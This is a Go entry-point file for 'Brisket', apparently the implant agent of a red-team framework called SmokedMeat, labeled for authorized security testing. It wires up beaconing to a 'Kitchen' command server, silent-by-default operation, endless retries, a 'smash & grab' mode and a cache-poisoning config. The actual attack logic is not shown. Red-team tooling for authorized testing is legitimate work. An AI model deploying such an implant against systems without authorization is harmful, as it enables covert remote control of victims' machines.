// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

// Package main implements the Brisket implant/agent.
package main

import (
	"context"
	"flag"
	"fmt"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/boostsecurityio/smokedmeat/internal/brisket"
	"github.com/boostsecurityio/smokedmeat/internal/buildinfo"
)

func main() {
	if err := run(); err != nil {
		fmt.Fprintf(os.Stderr, "error: %v\n", err)
		os.Exit(1)
	}
}

func run() error {
	if len(os.Args) > 1 && os.Args[1] == "version" {
		fmt.Print(buildinfo.String())
		return nil
	}

	// Custom usage with banner
	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "SmokedMeat Brisket %s - Implant Agent\n", buildinfo.Version)
		fmt.Fprintln(os.Stderr, "Copyright (C) 2026 boostsecurity.io")
		fmt.Fprintln(os.Stderr, "Licensed under AGPL v3.0 - For authorized security testing only.")
		fmt.Fprintln(os.Stderr)
		fmt.Fprintln(os.Stderr, "Usage: brisket [options]")
		fmt.Fprintln(os.Stderr)
		fmt.Fprintln(os.Stderr, "Options:")
		flag.PrintDefaults()
	}

	// Parse flags
	var (
		kitchenURL     string
		sessionID      string
		agentID        string
		agentToken     string
		callbackID     string
		callbackMode   string
		beaconInterval time.Duration
		maxOffline     time.Duration
		dwellTime      time.Duration
		expressMode    bool
		cachePoison    string
	)

	flag.StringVar(&kitchenURL, "kitchen", getEnvOrDefault("KITCHEN_URL", "http://localhost:8080"), "Kitchen URL")
	flag.StringVar(&sessionID, "session", getEnvOrDefault("SESSION_ID", ""), "Session ID")
	flag.StringVar(&agentID, "agent", getEnvOrDefault("AGENT_ID", ""), "Agent ID (if not set, generates random)")
	flag.StringVar(&agentToken, "token", getEnvOrDefault("AGENT_TOKEN", ""), "Agent authentication token")
	flag.StringVar(&callbackID, "callback-id", getEnvOrDefault("CALLBACK_ID", ""), "Callback ID for persistent callback tracking")
	flag.StringVar(&callbackMode, "callback-mode", getEnvOrDefault("CALLBACK_MODE", ""), "Callback mode for tracking")
	flag.DurationVar(&beaconInterval, "interval", 30*time.Second, "Beacon interval")
	flag.DurationVar(&maxOffline, "max-offline", getEnvOrDefaultDuration("MAX_OFFLINE", 0), "Maximum time to keep retrying while Kitchen is unreachable (0 = retry forever)")
	flag.DurationVar(&dwellTime, "dwell", 0, "Dwell time (how long to stay active for interactive commands, 0=run once in express mode)")
	flag.BoolVar(&expressMode, "express", false, "Express mode (smash & grab)")
	flag.StringVar(&cachePoison, "cache-poison", getEnvOrDefault("CACHE_POISON_CONFIG", ""), "Base64-encoded cache poisoning deployment config")
	verbose := flag.Bool("verbose", false, "Enable verbose logging (default: silent)")
	flag.Parse()

	// Create context that cancels on interrupt
	ctx, cancel := signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
	defer cancel()

	// Create agent config
	config := brisket.DefaultConfig()
	config.KitchenURL = kitchenURL
	config.SessionID = sessionID
	config.AgentID = agentID
	config.AgentToken = agentToken
	config.CallbackID = callbackID
	config.CallbackMode = callbackMode
	config.BeaconInterval = beaconInterval
	config.MaxOffline = maxOffline
	config.DwellTime = dwellTime
	config.CachePoisonConfig = cachePoison
	config.Silent = !*verbose

	// Create and run agent
	agent := brisket.New(config)

	if expressMode {
		if dwellTime > 0 {
			return agent.RunWithDwell(ctx, dwellTime)
		}
		return agent.RunOnce(ctx)
	}

	return agent.Run(ctx)
}

func getEnvOrDefault(key, defaultValue string) string {
	if value := os.Getenv(key); value != "" {
		return value
	}
	return defaultValue
}

func getEnvOrDefaultDuration(key string, defaultValue time.Duration) time.Duration {
	value := strings.TrimSpace(os.Getenv(key))
	if value == "" {
		return defaultValue
	}
	parsed, err := time.ParseDuration(value)
	if err != nil {
		return defaultValue
	}
	return parsed
}
